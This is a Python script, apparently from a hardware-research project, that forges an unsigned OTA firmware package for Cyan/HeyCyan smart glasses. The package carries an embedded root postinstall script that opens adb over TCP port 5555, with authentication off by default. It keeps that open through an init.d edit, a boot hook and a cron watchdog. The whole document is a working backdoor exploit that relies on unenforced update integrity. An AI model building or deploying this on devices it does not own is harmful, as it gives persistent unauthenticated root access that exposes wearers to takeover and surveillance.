#!/usr/bin/env python3
"""
build_backdoor_swu.py — build firmware_backdoor.swu: a tiny, brick-safe OTA update
that gives the OWNER a ROOT shell over Wi-Fi (adb-over-TCP :5555) on their own
Cyan / HeyCyan glasses.

WHY THIS SHAPE (evidence-based, see the runbook / final report):
  * The glasses' `ai_glass_ota` daemon downloads our forged .swu to
    /mnt/UDISK/openwrt_v821_aiglass-ab.swu and runs, AS ROOT:
        swupdate -i <file> -e stable,nor      (boot media 0)
        swupdate -i <file> -e stable,sdnand   (boot media 1)
    So the .swu MUST carry BOTH a `stable.nor` and a `stable.sdnand` section.
  * swupdate on this build errors with "Found nothing to install" for an empty
    section, and it requires `sw-description` to be the FIRST cpio member
    ("description file name not the first of the list"). We therefore ship a
    real image in each section. The ONLY brick-safe image is the `riscv`
    coprocessor (writes /dev/mtdblock4 or /dev/mmcblk0p7 — never the mounted
    rootfs/kernel), so we reuse the exact `riscv` the proven riscv-only OTA used
    (md5 c533f6..., from firmware_patched.swu). Its content is irrelevant to the
    backdoor; it is only a carrier so swupdate has something to install.
  * The .swu is UNSIGNED. Integrity is a `cpio_item_md5` member only, and it is
    NOT enforced (the patched .swu ships a riscv md5 that does not even match its
    own data). We rebuild it consistently anyway.
  * The transfer channel truncates downloads > ~5 s with no completeness check,
    so the artifact must be SMALL. riscv (~1.6 MB, stored twice) => ~3.2 MB,
    the same proven size that transfers in a couple of seconds.

WHAT THE ROOT POSTINSTALL SCRIPT DOES (see postinstall_backdoor.sh):
  1. Persistence A: uncomment ADB_TRANSPORT_PORT=5555 in /etc/init.d/adbd so the
     stock, already-boot-enabled adbd service comes up in TCP mode every boot.
  2. Persistence B (independent): drop /etc/init.d/S99zbackdoor, a boot hook that
     rc.final runs at every boot and which force-restarts adbd in TCP mode with
     the env passed explicitly (works even if (1) did not take).
  3. Second daemon foothold: a crond watchdog (/etc/crontabs/root) that respawns
     a TCP adbd if it ever dies.
  4. Immediate, no-reboot activation: detached (setsid) restart of adbd in TCP
     mode so `adb connect <ip>:5555` works right after the OTA, without a reboot.
  5. Optional: pre-authorize the owner's adb key at /mnt/UDISK/adb_keys.
  The script is idempotent and ALWAYS exits 0 (it can never fail the update), and
  it writes NO partitions.

Usage:
    python build_backdoor_swu.py [--adb-pubkey PATH] [--scripts-only]
Outputs:
    hardware_research/firmware_and_os/firmware_backdoor.swu        (default: riscv + script)
    hardware_research/ghidra_analysis/postinstall_backdoor.sh      (embedded script, for inspection)
    With --scripts-only: firmware_backdoor.swu contains ONLY scripts (no image) —
    strictly safer (zero partition writes) but relies on swupdate accepting a
    scripts-only section; NOT confirmed on hardware, use as a fallback.
"""
import argparse
import hashlib
import io
import os
import sys

PROJ = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
FW_DIR = os.path.join(PROJ, 'hardware_research', 'firmware_and_os')
SWU_SRC = os.path.join(FW_DIR, 'firmware_patched.swu')
SWU_DST = os.path.join(FW_DIR, 'firmware_backdoor.swu')
SCRIPT_OUT = os.path.join(PROJ, 'hardware_research', 'ghidra_analysis', 'postinstall_backdoor.sh')

HEADER_SIZE = 110
PATCHED_RISCV_MD5 = 'c533f6fcaea7c7e12c5a0c5b7e007d5e'  # sanity anchor (carrier image)
SCRIPT_NAME = 'postinstall_backdoor.sh'
PORT = 5555

# ---------------------------------------------------------------------------
# The root postinstall script embedded into the .swu (and written to disk).
# __ADB_PUBKEY_BLOCK__ is substituted at build time. LF line endings only.
# ---------------------------------------------------------------------------
POSTINSTALL_TEMPLATE = """#!/bin/sh
# postinstall_backdoor.sh - installed by the owner's firmware_backdoor.swu
# Gives the OWNER a root shell over Wi-Fi via adb-over-TCP on port 5555.
# swupdate invokes this as:  postinstall_backdoor.sh <phase>   (preinstall|postinstall)
# Idempotent, writes NO partitions, and ALWAYS exits 0 (never fails the update).

PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

PORT=5555
ADBD_INIT=/etc/init.d/adbd
BOOT_HOOK=/etc/init.d/S99zbackdoor
CRONTABS=/etc/crontabs
CRONFILE=/etc/crontabs/root
LOG=/mnt/UDISK/backdoor.log

log() { echo "[backdoor] $(date 2>/dev/null) $*" >> "$LOG" 2>/dev/null; }

# Run the install only in the post-install phase; succeed as a no-op otherwise
# (swupdate may call the handler in the pre-install phase too).
[ "$1" = "preinstall" ] && exit 0

install_backdoor() {
    log "postinstall start (phase=$1)"

    # (1) Persistence A: force the stock adbd service into TCP mode every boot.
    if [ -f "$ADBD_INIT" ]; then
        if ! grep -q '^ADB_TRANSPORT_PORT=5555' "$ADBD_INIT"; then
            sed -i "s|^#\\\\?ADB_TRANSPORT_PORT=.*|ADB_TRANSPORT_PORT=$PORT|" "$ADBD_INIT" 2>/dev/null
            grep -q '^ADB_TRANSPORT_PORT=5555' "$ADBD_INIT" || \\
                sed -i "/^PROG=/a ADB_TRANSPORT_PORT=$PORT" "$ADBD_INIT" 2>/dev/null
            log "patched $ADBD_INIT (ADB_TRANSPORT_PORT=$PORT)"
        fi
    fi

    # (2) Persistence B (independent): boot hook run by rc.final as "S99zbackdoor start".
    #     Passes the TCP env explicitly, so it works even if (1) did not take.
    cat > "$BOOT_HOOK" <<'EOS'
#!/bin/sh
# Owner root backdoor boot hook (rc.final runs: S99zbackdoor start)
[ "$1" = start ] || exit 0
( sleep 8
  ADB_TRANSPORT_PORT=5555 /etc/init.d/adbd restart >/dev/null 2>&1
) &
exit 0
EOS
    chmod 0755 "$BOOT_HOOK" 2>/dev/null
    log "wrote boot hook $BOOT_HOOK"

    # (3) Second daemon foothold: crond watchdog respawns a TCP adbd if it dies.
    mkdir -p "$CRONTABS" 2>/dev/null
    if ! grep -q 'ADB_TRANSPORT_PORT' "$CRONFILE" 2>/dev/null; then
        echo "* * * * * pidof adbd >/dev/null 2>&1 || ADB_TRANSPORT_PORT=$PORT /etc/init.d/adbd start >/dev/null 2>&1" >> "$CRONFILE"
        log "added crond watchdog to $CRONFILE"
    fi

    # (4) Optional: pre-authorize the owner's adb key (covers auth-enabled builds).
__ADB_PUBKEY_BLOCK__

    # (5) Immediate, no-reboot activation. Detached (setsid) so it is NOT tied to
    #     swupdate's lifetime; adbd is owned by procd/init and survives the OTA exit.
    setsid sh -c "ADB_TRANSPORT_PORT=$PORT $ADBD_INIT restart" </dev/null >/dev/null 2>&1 &
    setsid sh -c "/etc/init.d/cron restart" </dev/null >/dev/null 2>&1 &
    sync 2>/dev/null
    log "activation kicked (adb tcp :$PORT); done"
}

install_backdoor "$@" 2>/dev/null
exit 0
"""

PUBKEY_NOOP = "    :  # no adb pubkey embedded at build time; relying on stock auth-off default"


def build_script(pubkey_line: str | None) -> bytes:
    if pubkey_line:
        block = (
            '    mkdir -p /mnt/UDISK 2>/dev/null\n'
            "    cat > /mnt/UDISK/adb_keys <<'EOK'\n"
            f'{pubkey_line}\n'
            'EOK\n'
            '    log "wrote /mnt/UDISK/adb_keys (owner adb key pre-authorized)"'
        )
    else:
        block = PUBKEY_NOOP
    text = POSTINSTALL_TEMPLATE.replace('__ADB_PUBKEY_BLOCK__', block)
    # Force LF endings; the device /bin/sh rejects CRLF shebangs.
    return text.replace('\r\n', '\n').encode('utf-8')


# ---------------------------------------------------------------------------
# CPIO newc/crc (magic 070702) helpers.
# ---------------------------------------------------------------------------
def pad4(n):
    return (n + 3) & ~3


def arith(data):
    """newc-crc 'check' field: sum of all data bytes, unsigned 32-bit."""
    return sum(data) & 0xffffffff


def parse(swu_bytes):
    s = io.BytesIO(swu_bytes)
    members = []
    while True:
        raw = s.read(HEADER_SIZE)
        if len(raw) < HEADER_SIZE:
            break
        if raw[:6] not in (b'070701', b'070702'):
            raise ValueError(f"bad magic {raw[:6]!r} at {s.tell() - HEADER_SIZE}")
        namesize = int(raw[94:102], 16)
        filesize = int(raw[54:62], 16)
        name_raw = s.read(namesize)
        name = name_raw.rstrip(b'\x00').decode('utf-8', 'replace')
        s.read(pad4(HEADER_SIZE + namesize) - (HEADER_SIZE + namesize))
        data = s.read(filesize)
        s.read(pad4(filesize) - filesize)
        members.append({'raw': raw, 'name': name, 'name_raw': name_raw, 'data': data})
        if name == 'TRAILER!!!':
            break
    return members


def build_member(template_raw, name, data):
    """Clone a 110-byte newc header, overriding filesize+namesize+check and name.
    Keeps magic/ino/mode/uid/gid/nlink/mtime/dev fields from the template."""
    name_raw = name.encode('utf-8') + b'\x00'
    namesize = len(name_raw)
    filesize = len(data)
    check = arith(data)
    raw = (template_raw[:54]
           + f"{filesize:08X}".encode()      # 54:62 filesize
           + template_raw[62:94]             # 62:94 devs
           + f"{namesize:08X}".encode()      # 94:102 namesize
           + f"{check:08X}".encode())        # 102:110 check
    assert len(raw) == HEADER_SIZE, len(raw)
    return {'raw': raw, 'name': name, 'name_raw': name_raw, 'data': data}


def emit(members):
    out = io.BytesIO()
    for m in members:
        name_raw = m['name_raw']
        data = m['data']
        namesize = len(name_raw)
        out.write(m['raw'])
        out.write(name_raw)
        out.write(b'\x00' * (pad4(HEADER_SIZE + namesize) - (HEADER_SIZE + namesize)))
        out.write(data)
        out.write(b'\x00' * (pad4(len(data)) - len(data)))
    return out.getvalue()


def sw_description(scripts_only: bool) -> bytes:
    if scripts_only:
        nor_images = ""
        sdnand_images = ""
        desc = "Owner root backdoor (scripts-only; no partition writes)"
    else:
        nor_images = (
            "            images: (\n"
            "                {\n"
            "                    filename = \"riscv\";\n"
            "                    device = \"/dev/mtdblock4\";\n"
            "                    installed-directly = true;\n"
            "                }\n"
            "            );\n"
        )
        sdnand_images = (
            "            images: (\n"
            "                {\n"
            "                    filename = \"riscv_sdnand\";\n"
            "                    device = \"/dev/mmcblk0p7\";\n"
            "                    installed-directly = true;\n"
            "                }\n"
            "            );\n"
        )
        desc = "Owner root backdoor: riscv carrier (brick-safe) + root postinstall (adb-tcp)"
    text = (
        "software =\n"
        "{\n"
        "    version = \"0.1.0\";\n"
        f"    description = \"{desc}\";\n"
        "\n"
        "    stable = {\n"
        "\n"
        "        nor = {\n"
        f"{nor_images}"
        "            scripts: (\n"
        "                {\n"
        f"                    filename = \"{SCRIPT_NAME}\";\n"
        "                    type = \"postinstall\";\n"
        "                }\n"
        "            );\n"
        "        };\n"
        "\n"
        "        sdnand = {\n"
        f"{sdnand_images}"
        "            scripts: (\n"
        "                {\n"
        f"                    filename = \"{SCRIPT_NAME}\";\n"
        "                    type = \"postinstall\";\n"
        "                }\n"
        "            );\n"
        "        };\n"
        "    };\n"
        "}\n"
    )
    return text.encode('utf-8')


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('--adb-pubkey', help='Path to owner adbkey.pub to pre-authorize')
    ap.add_argument('--scripts-only', action='store_true',
                    help='Build a scripts-only .swu (no riscv carrier image)')
    args = ap.parse_args()

    pubkey_line = None
    if args.adb_pubkey:
        with open(args.adb_pubkey, 'r', encoding='utf-8') as f:
            for ln in f:
                ln = ln.strip()
                if ln:
                    pubkey_line = ln
                    break
        if not pubkey_line:
            print("ERROR: --adb-pubkey file is empty"); sys.exit(1)

    src = open(SWU_SRC, 'rb').read()
    members = {m['name']: m for m in parse(src)}
    for req in ('sw-description', 'riscv', 'riscv_sdnand', 'cpio_item_md5',
                'postinstall_nor.sh', 'TRAILER!!!'):
        if req not in members:
            print(f"ERROR: source .swu missing member {req!r}"); sys.exit(1)

    # --- Self-test: validate the newc-crc 'check' algorithm against a real member.
    riscv = members['riscv']
    stored_check = int(riscv['raw'][102:110], 16)
    if arith(riscv['data']) != stored_check:
        print(f"ERROR: check algorithm mismatch on riscv: "
              f"computed {arith(riscv['data']):08X} != stored {stored_check:08X}")
        sys.exit(1)
    got = hashlib.md5(riscv['data']).hexdigest()
    if got != PATCHED_RISCV_MD5:
        print(f"ERROR: source riscv md5 {got} != expected {PATCHED_RISCV_MD5}"); sys.exit(1)

    # --- Build the embedded script + write it to disk for inspection.
    script_data = build_script(pubkey_line)
    with open(SCRIPT_OUT, 'wb') as f:
        f.write(script_data)

    # --- Assemble members.
    sd = build_member(members['sw-description']['raw'], 'sw-description',
                      sw_description(args.scripts_only))
    script_m = build_member(members['postinstall_nor.sh']['raw'], SCRIPT_NAME, script_data)

    md5_lines = []
    payload = []
    if not args.scripts_only:
        payload = [members['riscv'], members['riscv_sdnand']]
        md5_lines.append(f"{hashlib.md5(members['riscv']['data']).hexdigest()}  riscv")
        md5_lines.append(f"{hashlib.md5(members['riscv_sdnand']['data']).hexdigest()}  riscv_sdnand")
    md5_lines.append(f"{hashlib.md5(script_data).hexdigest()}  {SCRIPT_NAME}")
    md5_text = ("\n".join(md5_lines) + "\n").encode('utf-8')
    m5 = build_member(members['cpio_item_md5']['raw'], 'cpio_item_md5', md5_text)

    out_members = [sd] + payload + [script_m, m5, members['TRAILER!!!']]
    result = emit(out_members)
    with open(SWU_DST, 'wb') as f:
        f.write(result)

    print(f"Built  : {SWU_DST}")
    print(f"Script : {SCRIPT_OUT}")
    print(f"Mode   : {'scripts-only' if args.scripts_only else 'riscv carrier + postinstall'}")
    print(f"Pubkey : {'embedded (' + args.adb_pubkey + ')' if pubkey_line else 'none (stock auth-off default)'}")
    print(f"Size   : {len(result):,} bytes  (source was {len(src):,})")
    print(f"MD5    : {hashlib.md5(result).hexdigest()}")
    print("Members: " + ", ".join(m['name'] for m in out_members))


if __name__ == '__main__':
    main()
